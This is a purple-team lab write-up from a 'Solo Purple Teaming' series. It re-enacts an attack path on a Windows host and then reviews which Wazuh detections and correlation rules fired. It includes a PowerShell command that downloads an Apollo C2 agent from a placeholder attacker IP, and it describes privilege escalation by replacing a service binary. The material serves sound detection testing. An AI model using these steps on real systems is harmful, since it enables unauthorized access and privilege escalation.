---
layout: default
title: "Red Team Re-Engage For Level - Testing All Detecti"
permalink: /solo-purple-teaming/red-team-re-engage-for-level-testing-all-detecti/
---
<link rel="stylesheet" href="/assets/css/solo-purple-teaming.css">

<div class="spt-page">
<a class="spt-back" href="/solo-purple-teaming/">← Back to Solo Purple Teaming</a>
<section class="spt-hero">
<p class="spt-kicker">Solo Purple Teaming</p>
<h1>Red Team Re-Engage For Level - Testing All Detecti</h1>
</section>
<section class="spt-content">
<h1 id="red-team-re-engage-for-level---testing-all-detections">Red Team
Re-Engage For Level - Testing All Detections</h1>
<p>Owner: Mike Sterrett</p>
<h3 id="1-purpose-of-reengagement"><strong>1. Purpose of
Reengagement</strong></h3>
<ul>
<li><strong>Why we do it:</strong>
<ul>
<li>Validate detection improvements after the first round of
testing.</li>
<li>Confirm correlation rules actually work in practice.</li>
<li>Identify issues such as typos, missed alerts, or non-triggered
correlations.</li>
</ul></li>
<li><strong>Benefits:</strong>
<ul>
<li>Surfaces hidden bugs.</li>
<li>Encourages review of lessons learned.</li>
<li>Improves detection maturity and resilience.</li>
</ul></li>
</ul>
<hr />
<h3 id="2-starting-fresh"><strong>2. Starting Fresh</strong></h3>
<ul>
<li>Logged into <strong>Wazuh Manager</strong> → Solo Purple Teaming
dashboard.</li>
<li>Time range set to <strong>last 15 minutes</strong> – no alerts are
present.</li>
<li>Checked <strong>Mythic</strong> – no callbacks present.</li>
<li>On the <strong>assumed breached host</strong>, reset environment:
<ul>
<li>Deleted <strong>Apollo agent</strong>.</li>
<li>Restored <code>ecoin sync</code> to original state.</li>
</ul></li>
<li>Goal: Reenact <strong>Attack Path Level Zero</strong> from
scratch.</li>
</ul>
<hr />
<h3 id="3-initial-access"><strong>3. Initial Access</strong></h3>
<ol type="1">
<li>Execute initial access payload.</li>
<li><strong>Verify callback</strong> in Mythic – success.</li>
<li>Interact with the callback:
<ul>
<li>Run <code>whoami /priv</code> → View privileges (nothing
special).</li>
<li>Check <strong>local administrators group</strong> membership →
Service account present.</li>
</ul></li>
<li>Enumerate services:
<ul>
<li>Found <code>ecoin sync</code> service running as
<code>SVC_ecoin_sync</code> (local admin account).</li>
<li>Located binary on <strong>desktop</strong> → accessible to current
user.</li>
</ul></li>
</ol>
<hr />
<h3 id="4-service-abuse-setup"><strong>4. Service Abuse
Setup</strong></h3>
<ol type="1">
<li><strong>Check service permissions</strong> with security descriptor:
<ul>
<li>Found SID that can start/stop service.</li>
<li>Matched SID to current user (<code>arlin</code>) → confirms control
over service.</li>
</ul></li>
<li><strong>Prepare payloads</strong>:
<ul>
<li><p>Pull <strong>Apollo agent</strong> using PowerShell:</p>
<div class="sourceCode" id="cb1"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">Invoke-WebRequest</span> <span class="op">-</span>Uri http<span class="op">://&lt;</span>attacker_ip<span class="op">&gt;:</span><span class="dv">8000</span><span class="op">/</span>apollo<span class="op">.</span><span class="fu">exe</span> <span class="op">-</span>OutFile Downloads\apollo<span class="op">.</span><span class="fu">exe</span></span></code></pre></div></li>
<li><p>Verify file in <code>Downloads</code>.</p></li>
</ul></li>
<li><strong>Replace service binary</strong>:
<ul>
<li>Rename original <code>ecoin sync</code> binary to
<code>.bak</code>.</li>
<li>Download service wrapper (prebuilt from previous engagement).</li>
<li>Verify service wrapper on desktop.</li>
</ul></li>
</ol>
<hr />
<h3 id="5-payload-execution"><strong>5. Payload Execution</strong></h3>
<ol type="1">
<li>Start the modified service.</li>
<li><strong>Get new callback</strong>:
<ul>
<li>Callback is <strong>high integrity</strong> → running as
administrator.</li>
</ul></li>
<li>OPSEC maintained throughout the operation.</li>
</ol>
<hr />
<h3 id="6-detection-review"><strong>6. Detection Review</strong></h3>
<ul>
<li>Back in Wazuh dashboard:
<ul>
<li>Alerts: 3 critical, 3 high, 5 medium.</li>
<li><strong>Reflection detection</strong> fired.</li>
<li><strong>Time-based correlation</strong> fired.</li>
<li><strong>Advanced correlation (possible C2)</strong> <strong>did NOT
fire</strong>.</li>
</ul></li>
</ul>
<hr />
<h3 id="7-troubleshooting-advanced-correlation-engine"><strong>7.
Troubleshooting Advanced Correlation Engine</strong></h3>
<ol type="1">
<li><p>Tailing <code>correlation.json</code> showed no alerts.</p></li>
<li><p>Edited <code>waza_ace.py</code> script:</p>
<ul>
<li>Adjusted log reading frequency from <code>0.75</code> seconds to
<code>0.25</code> seconds.</li>
</ul></li>
<li><p>Restarted service:</p>
<div class="sourceCode" id="cb2"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> systemctl restart waza-ace</span></code></pre></div></li>
<li><p>Re-ran initial access payload.</p></li>
<li><p>This time:</p>
<ul>
<li>Correlation alerts triggered (including <strong>possible C2
activity</strong>).</li>
<li>Issue likely due to file reading delay or log push timing.</li>
</ul></li>
</ol>
<hr />
<h3 id="8-lessons-for-solo-purple-teamers"><strong>8. Lessons for Solo
Purple Teamers</strong></h3>
<ul>
<li>Custom tools (like the advanced correlation engine) require
<strong>constant tuning</strong>.</li>
<li>Consider alternative file monitoring methods for reliability.</li>
<li>Share improvements with the community (e.g., Discord).</li>
<li>Always <strong>run reengagements</strong> before moving on to next
attack path level:
<ul>
<li>See which detections fire.</li>
<li>Identify missed detections.</li>
<li>Plan improvements.</li>
</ul></li>
</ul>
<hr />
<h3 id="9-next-steps"><strong>9. Next Steps</strong></h3>
<ul>
<li>Moving to <strong>Attack Path Level One</strong>:
<ul>
<li>Expands the Level Zero attack path.</li>
<li>Demonstrates how brittle detections can be.</li>
<li>Shows bypass techniques.</li>
<li>Purposefully weak rules from Level Zero will be tested and
broken.</li>
</ul></li>
</ul>
</section>
</div>
